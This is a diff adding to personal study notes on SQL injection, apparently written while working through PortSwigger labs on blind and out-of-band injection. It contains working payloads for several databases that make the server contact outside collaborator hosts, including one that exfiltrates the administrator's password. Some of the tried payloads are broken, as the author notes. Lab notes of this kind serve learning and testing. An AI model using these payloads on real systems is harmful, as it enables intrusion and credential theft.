@@ -1,5 +1,13 @@
-## Sql injection cheat sheet
+First you determine the db you're dealing with
 https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+The hardest is when there's an sql injection but errors are handeled gracefully and not returned and no data is returned
+And so the only way to exploit it is to try to trigger time delays, or to make outbound requests
+
+Sometimes server response time may not depend on db response time and there still might be sqli somewhere. In those cases we can use OAST attacks in order to trigger db to make a request and send some data in that request to our own remote server
+
+## Check if table exists
+' AND (SELECT 'x' FROM users LIMIT 1)='x'--
 
 ## General tips 
 On MySQL, the double-dash sequence '--' must be followed by a space. 
@@ -249,6 +257,74 @@ Example of a solved lab:
 ```
 TrackingId=x'||pg_sleep(10)--
 ```
+
+## Exploiting blind SQL injection using out-of-band (OAST) techniques
+The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query. 
+The query is executed in a separate thread and the servers does not wait for a result.
+
+### Lab: Blind SQL injection with out-of-band interaction
+There's a `Cookie: TrackingId` value of which is vlulnerable to sqli.
+**The SQL query is executed asynchronously and has no effect on the application's response**
+
+Tried postgres (most likely there should be a `;` sign after the single quote):
+```bash
+Cookie: TrackingId=iC8jyK4B3oh2zI5t'%3b copy (SELECT '') to program 'nslookup owofgq565l0jlsgypvahmi3cu30uokc9.oastify.com' -- ;
+```
+Tried microsoft:
+```bash
+Cookie: TrackingId=iC8jyK4B3oh2zI5t'%3b exec master..xp_dirtree '//owofgq565l0jlsgypvahmi3cu30uokc9.oastify.com/a'-- ;
+```
+Mysql:
+```bash
+Cookie: TrackingId=iC8jyK4B3oh2zI5t'%3b LOAD_FILE('\\\\85bzpaeqe593ucpiyfj1v2cw3n9ex6lv.oastify.com\\a') SELECT ... INTO OUTFILE '\\\\85bzpaeqe593ucpiyfj1v2cw3n9ex6lv.oastify.com\a' -- ;
+```
+Tried oracle:
+```bash
+Cookie: TrackingId=iC8jyK4B3oh2zI5t'%3b SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://owofgq565l0jlsgypvahmi3cu30uokc9.oastify.com/"> %remote;]>'),'/l') FROM dual -- ;
+```
+Tried oracle high priv:
+```bash
+Cookie: TrackingId=iC8jyK4B3oh2zI5t'%3b SELECT UTL_INADDR.get_host_address('85bzpaeqe593ucpiyfj1v2cw3n9ex6lv.oastify.com') -- ;
+```
+
+Solution turned out to be:
+```bash
+Cookie: TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://qoih8sx8xnsldu80hx2jekvem5swgr4g.oastify.com/"> %remote;]>'),'/l') FROM dual -- ;
+```
+But it didn't work, because it needed to be url encoded:
+```bash
+Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual+--+;
+```
+
+> Note: in Oracle you use UNION, but I used `;` after the `TrackingId=x'`  
+> Note: my payload did not work because I didn't url encode
+
+### Lab: Blind SQL injection with out-of-band data exfiltration
+There's a `Cookie: TrackingId` value of which is vlulnerable to sqli.
+
+First I try to find out if there's an sqli vulnerability at all.
+For that purpose I try the following payload (I actually url encode it, but here for the purpose of readability I don't):
+```bash
+Cookie: TrackingId=x' AND SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://hl6agr3zzmj21sebjha893bhw82zqpee.oastify.com/"> %remote;]>'),'/l') FROM dual -- ;
+```
+I try another:
+```bash
+Cookie: TrackingId=x' AND SELECT UTL_INADDR.get_host_address('http://hl6agr3zzmj21sebjha893bhw82zqpee.oastify.com') -- ;
+```
+Again:
+```bash
+Cookie: TrackingId=x' AND exec master..xp_dirtree '//http://hl6agr3zzmj21sebjha893bhw82zqpee.oastify.com/a' -- ;
+```
+Again:
+```bash
+Cookie: TrackingId=x' AND copy (SELECT '') to program 'nslookup http://hl6agr3zzmj21sebjha893bhw82zqpee.oastify.com' -- ;
+```
+
+Nothing worked so the solution:
+```bash
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.http://hl6agr3zzmj21sebjha893bhw82zqpee.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+
 
 ## SQL injection in different contexts
 You can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.
